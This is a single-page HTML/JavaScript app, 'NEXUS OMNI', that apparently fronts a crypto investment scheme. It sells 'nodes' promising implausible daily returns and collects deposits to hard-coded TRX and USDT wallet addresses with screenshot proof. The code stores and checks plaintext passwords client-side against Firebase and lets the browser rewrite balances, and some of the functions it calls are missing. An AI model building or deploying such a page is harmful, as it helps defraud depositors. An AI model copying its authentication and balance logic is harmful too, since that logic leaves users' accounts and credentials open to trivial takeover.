<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Professional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-black: #020617; }
        body { background: #f8fafc; color: #0f172a; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        
        .node-card { background: #ffffff; border-radius: 24px; overflow: hidden; display: flex; align-items: center; height: 120px; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.03); }
        .node-img { width: 110px; height: 120px; object-fit: cover; }
        .node-info { padding: 0 15px; flex: 1; display: flex; flex-direction: column; justify-content: center; }
        
        .glass-card { background: #ffffff; border-radius: 32px; box-shadow: 0 20px 40px -15px rgba(0,0,0,0.06); }
        .btn-prime { background: var(--nexus-black); color: #fff; border-radius: 20px; font-weight: 800; padding: 18px; transition: 0.3s; border: none; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .input-prime { background: #f1f5f9; border-radius: 18px; padding: 16px; width: 100%; border: 2px solid transparent; outline: none; font-weight: 600; }
        .input-prime:focus { border-color: var(--nexus-blue); background: #fff; }
        
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; cursor: pointer; flex: 1; transition: 0.3s; }
        .nav-link.active { color: var(--nexus-blue); transform: translateY(-3px); }
        
        .legal-modal { display: none; position: fixed; inset: 0; background: white; z-index: 20000; overflow-y: auto; padding: 30px; animation: slideUp 0.4s cubic-bezier(0, 1, 0.5, 1); }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        #preloader { position: fixed; inset: 0; background: #fff; z-index: 30000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-12 h-12 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
        <p class="mt-4 text-[9px] font-black uppercase tracking-[4px] text-slate-400">Verifying Nodes...</p>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter">NEXUS<span class="text-blue-600">.</span></h1>
            </div>
            <div id="login-box" class="glass-card p-10 space-y-6">
                <input type="text" id="l-user" placeholder="Identifier" class="input-prime">
                <input type="password" id="l-pass" placeholder="Security PIN" class="input-prime">
                <button onclick="login()" class="btn-prime">Verify</button>
                <p class="text-center text-[10px] font-bold text-slate-400 uppercase">New? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Register</span></p>
            </div>
            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Set Identifier" class="input-prime">
                <input type="password" id="s-pass" placeholder="Set PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime">Create</button>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-40">
        <header class="p-6 sticky top-0 z-50 bg-white/80 backdrop-blur-3xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-adm" class="w-12 h-12 bg-black text-white rounded-2xl flex items-center justify-center text-xl font-black">N</div>
                <p id="display-name" class="text-sm font-black text-slate-900 uppercase">---</p>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center text-slate-400"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-8">
            <div class="glass-card p-10 relative overflow-hidden shadow-2xl">
                <div class="relative z-10 space-y-8">
                    <div>
                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Available Capital</p>
                        <h2 id="ui-bal" class="text-5xl font-black mt-2 text-slate-900">$0.00</h2>
                    </div>
                    <div>
                        <p class="text-[9px] font-bold text-slate-500 uppercase">Accumulated Profit</p>
                        <p id="ui-prof" class="text-2xl font-black text-emerald-600">+$0.00</p>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <button onclick="showLegal('about')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 shadow-sm">About</button>
                <button onclick="showLegal('faq')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 shadow-sm">FAQ</button>
            </div>

            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-[4px]">Active Nodes</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 space-y-6 hidden">
            <h3 class="text-xs font-black uppercase border-l-4 border-blue-600 pl-3">Sovereign Nodes</h3>
            <div id="elite-box" class="space-y-4"></div>
            <h3 class="text-xs font-black uppercase border-l-4 border-slate-300 pl-3 mt-8">Retail Protocols</h3>
            <div id="retail-box" class="space-y-4"></div>
        </main>

        <main id="tab-bank" class="p-6 space-y-6 hidden">
            <div class="glass-card p-8 space-y-4">
                <select id="d-asset" class="input-prime font-bold" onchange="updAddr()">
                    <option value="">Choose Asset</option>
                    <option value="TRX">TRX (Trust)</option>
                    <option value="USDT">USDT (Binance)</option>
                </select>
                <div id="d-panel" class="hidden space-y-4 pt-4 border-t">
                    <p id="addr-txt" class="text-[10px] font-mono font-black text-blue-600 text-center break-all bg-slate-50 p-4 rounded-xl"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="TID / Hash" class="input-prime">
                    <input type="file" id="d-img" class="text-[10px]">
                    <button onclick="sendD()" class="btn-prime">Submit Deposit</button>
                </div>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden">
            <div id="ledger-box" class="space-y-4"></div>
        </main>

        <nav class="fixed bottom-8 left-6 right-6 h-20 glass-card shadow-2xl flex justify-around items-center px-2 z-[1000]">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-home text-xl mb-1"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-server text-xl mb-1"></i><br>ASSETS</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-xl mb-1"></i><br>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-list text-xl mb-1"></i><br>LEDGER</div>
        </nav>
    </div>

    <div id="legal-modal" class="legal-modal">
        <button onclick="closeLegal()" class="text-3xl float-right">&times;</button>
        <h2 id="legal-h" class="text-2xl font-black uppercase mb-6 mt-10">---</h2>
        <div id="legal-body" class="text-sm text-slate-500 space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeData = {
            elite: [
                { id: 'e1', name: "Sovereign Alpha", price: 3000, daily: 350, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" },
                { id: 'e2', name: "Titan Protocol", price: 7500, daily: 900, img: "https://images.unsplash.com/photo-1642104704074-907c0698cbd9?w=400" }
            ],
            retail: Array.from({length: 10}, (_, i) => ({
                id: `r${i}`, name: `Node Protocol v${i+1}`, price: 100 + (i*200), daily: 10 + (i*15), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}`
            }))
        };

        window.onload = () => {
            renderCatalog();
            setTimeout(() => document.getElementById('preloader').style.display='none', 1000);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        function renderCatalog() {
            const ui = (n) => `
                <div class="node-card">
                    <img src="${n.img}" class="node-img">
                    <div class="node-info">
                        <h4 class="text-[11px] font-black uppercase text-slate-800">${n.name}</h4>
                        <p class="text-[10px] font-bold text-emerald-600">Daily: $${n.daily}</p>
                        <div class="flex justify-between items-center mt-3">
                            <span class="text-lg font-black">$${n.price}</span>
                            <button onclick="deployNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">DEPLOY</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        }

        // CRITICAL FIX: DEPLOY SYSTEM
        window.deployNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr');
            const snap = await get(ref(db, `users/${uid}`));
            const userData = snap.val();

            if (userData.balance < price) {
                alert("Insufficient Capital! Please deposit funds.");
                return;
            }

            const newBal = userData.balance - price;
            const nodeKey = push(ref(db, `users/${uid}/nodes`)).key;
            const claimTime = Date.now() + 86400000;

            await update(ref(db, `users/${uid}`), { balance: newBal });
            await set(ref(db, `users/${uid}/nodes/${nodeKey}`), { name: name, nextClaim: claimTime, deployedAt: Date.now() });
            
            alert(`${name} Deployed Successfully!`);
            nav('home');
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                
                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = nodes.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-4 border-blue-600">
                        <p class="text-[11px] font-black uppercase">${v.name}</p>
                        <span class="text-[10px] font-mono font-bold bg-slate-50 px-3 py-1 rounded-lg">ACTIVE</span>
                    </div>`).join('') || '<p class="text-center py-10 text-slate-300 uppercase text-[10px] font-black">No Protocols</p>';
            });
        }

        window.nav = (p) => {
            ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden'));
            document.getElementById('tab-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active'));
            event.currentTarget.classList.add('active');
        };

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Error");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); }
        };

        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.updAddr = () => {
            const m = document.getElementById('d-asset').value;
            const map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" };
            document.getElementById('addr-txt').innerText = map[m] || "";
            document.getElementById('d-panel').classList.toggle('hidden', !m);
        };
    </script>
</body>
</html>
